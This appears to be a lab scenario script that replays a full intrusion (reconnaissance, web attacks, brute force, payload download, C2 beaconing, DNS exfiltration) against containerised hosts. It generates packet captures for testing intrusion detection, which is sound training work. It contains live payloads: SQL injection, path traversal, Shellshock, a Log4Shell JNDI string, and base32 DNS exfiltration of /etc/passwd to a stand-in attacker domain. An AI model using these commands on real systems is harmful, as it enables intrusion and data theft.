#!/bin/bash
# Play the whole intrusion story while a full-packet capture runs on the firewall (fw:dmz0).
# Every phase is written with its time to output/scenario_timeline.txt = the GROUND TRUTH you
# later compare the Snort alerts / Zeek notices / NetworkMiner findings against.
#
#   docker compose up -d --build      # first
#   scripts/scenario.sh               # ~3 minutes -> pcaps/lab09_scenario.pcap
set -uo pipefail   # not -e: the attack steps are best-effort; one quirky exit must not abort the story
cd "$(dirname "$0")/.."
DC="docker compose"
TL=output/scenario_timeline.txt
mkdir -p output pcaps
: > "$TL"
phase() { printf '%s  epoch=%s  %s\n' "$(date -u +%FT%TZ)" "$(date +%s)" "$*" | tee -a "$TL"; }
on() { local h=$1; shift; $DC exec -T -e LFTP_OPTS="$LFTP_OPTS" "$h" sh -c "$*"; }
LFTP_OPTS="set ftp:passive-mode on; set xfer:clobber on; set net:timeout 10; set net:max-retries 2;"

rm -f pcaps/lab09_scenario.pcap
$DC up -d --force-recreate capture >/dev/null
# wait for tcpdump to actually open the file (it writes the 24-byte pcap header immediately),
# rather than trusting a fixed sleep - the capture must be running before any attack traffic.
for _ in $(seq 1 20); do [ -s pcaps/lab09_scenario.pcap ] && break; sleep 0.5; done
[ -s pcaps/lab09_scenario.pcap ] || { echo "ERROR: capture did not start"; $DC logs capture; exit 1; }
phase "P0 capture started on fw:dmz0 -> pcaps/lab09_scenario.pcap"

# ---------------------------------------------------------------------------------------------------
phase "P1 NORMAL   customer 203.0.113.30 browses www.corp.lab, staff login to /admin, alice uses FTP"
on customer '
  UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
  for p in / /img/logo.png /about.html /files/report.pdf; do curl -4 -s -o /dev/null -A "$UA" http://www.corp.lab$p; done
  curl -4 -s -o /dev/null -A "$UA" -u staff:letmein http://www.corp.lab/admin/
  FTP=$(dig +short ftp.corp.lab A)   # resolve first: the lftp resolver hangs on the REFUSED IPv6 lookup
  lftp -u "alice,Summer2026!" -e "$LFTP_OPTS get report.pdf -o /tmp/r.pdf; bye" $FTP'

# ---------------------------------------------------------------------------------------------------
phase "P2 RECON    attacker 203.0.113.66: ping, SYN scan (1000 ports), version scan, NSE http scripts"
on attacker '
  ping -c 3 10.10.90.20 >/dev/null
  nmap -sS -T4 -Pn --top-ports 1000 10.10.90.20 | grep -E "open|scanned"
  nmap -sV -Pn -p 21,22,80 10.10.90.20 | grep -E "^[0-9]+/tcp"
  nmap -Pn -p 80 --script http-headers,http-title 10.10.90.20 >/dev/null'

# ---------------------------------------------------------------------------------------------------
phase "P3 WEB      Nikto UA, ../ traversal, encoded traversal, SQLi x3, Shellshock, Log4Shell"
on attacker '
  B=http://10.10.90.20
  curl -s -o /dev/null -A "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)" $B/
  curl -s -o /dev/null --path-as-is "$B/../../../../etc/passwd"
  curl -s -o /dev/null "$B/search?q=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  curl -s -o /dev/null "$B/search?q=1%27%20OR%20%271%27%3D%271"
  curl -s -o /dev/null "$B/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users--"
  curl -s -o /dev/null -A "sqlmap/1.8.4#stable (https://sqlmap.org)" "$B/search?q=1%27%20AND%201=1%20UNION%20ALL%20SELECT%20NULL--"
  curl -s -o /dev/null -A "() { :; }; /bin/bash -c \"cat /etc/passwd\"" $B/cgi-bin/status
  curl -s -o /dev/null -H "X-Api-Version: \${jndi:ldap://203.0.113.66:1389/Exploit}" $B/'

# ---------------------------------------------------------------------------------------------------
phase "P4 BRUTE    hydra: SSH (webadmin), FTP (backup), HTTP Basic (/admin/ staff)"
on attacker '
  hydra -I -q -t 4 -f -l webadmin -P /opt/lab/wordlists/ssh.txt  ssh://10.10.90.20  2>&1 | grep -E "login:|valid"
  hydra -I -q -t 4 -f -l backup   -P /opt/lab/wordlists/ftp.txt  ftp://10.10.90.20  2>&1 | grep -E "login:|valid"
  hydra -I -q -t 4 -f -l staff    -P /opt/lab/wordlists/http.txt 10.10.90.20 http-get /admin/ 2>&1 | grep -E "login:|valid"'

# ---------------------------------------------------------------------------------------------------
phase "P5 ACCESS   FTP as backup: steal customers.csv, upload notes.txt; SSH as webadmin: run commands"
on attacker '
  lftp -u backup,backup123 -e "$LFTP_OPTS get customers.csv -o /tmp/customers.csv; put /etc/os-release -o notes.txt; bye" 10.10.90.20
  sshpass -p sunshine ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null webadmin@10.10.90.20 "id; uname -a" 2>/dev/null'

# ---------------------------------------------------------------------------------------------------
phase "P6 PAYLOAD  web01 resolves update.evil-cdn.lab, downloads payload.exe + EICAR test file"
on web01 '
  dig +short update.evil-cdn.lab A
  curl -4 -s -o /tmp/payload.exe http://update.evil-cdn.lab/payload.exe
  curl -4 -s -o /tmp/update.txt  http://update.evil-cdn.lab/update.txt'

# ---------------------------------------------------------------------------------------------------
phase "P7 C2       web01 beacons to update.evil-cdn.lab every 5 s (12x)"
on web01 '
  for i in $(seq 1 12); do
    curl -4 -s -o /dev/null -A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" "http://update.evil-cdn.lab/beacon?id=web01&seq=$i"
    sleep 5
  done'

# ---------------------------------------------------------------------------------------------------
phase "P8 EXFIL    web01 leaks /etc/passwd as base32 labels in DNS queries (*.x.evil-cdn.lab)"
on web01 '
  i=0
  base32 /etc/passwd | tr -d "=\n" | tr A-Z a-z | fold -w 60 | head -12 | while read c; do
    i=$((i+1)); dig +short "$c.$i.x.evil-cdn.lab" A >/dev/null || true
  done'

sleep 3
$DC stop capture >/dev/null && $DC rm -f capture >/dev/null
phase "P9 capture stopped"
echo
ls -l pcaps/lab09_scenario.pcap
echo "live Snort alerts so far: $(wc -l < output/live/snort/alert_fast.txt 2>/dev/null || echo 0)   (output/live/snort/alert_fast.txt)"
echo "live Zeek notices so far: $(grep -vc '^#' output/live/zeek/notice.log 2>/dev/null || echo 0)   (output/live/zeek/notice.log)"
echo "next: scripts/analyze.sh scenario"
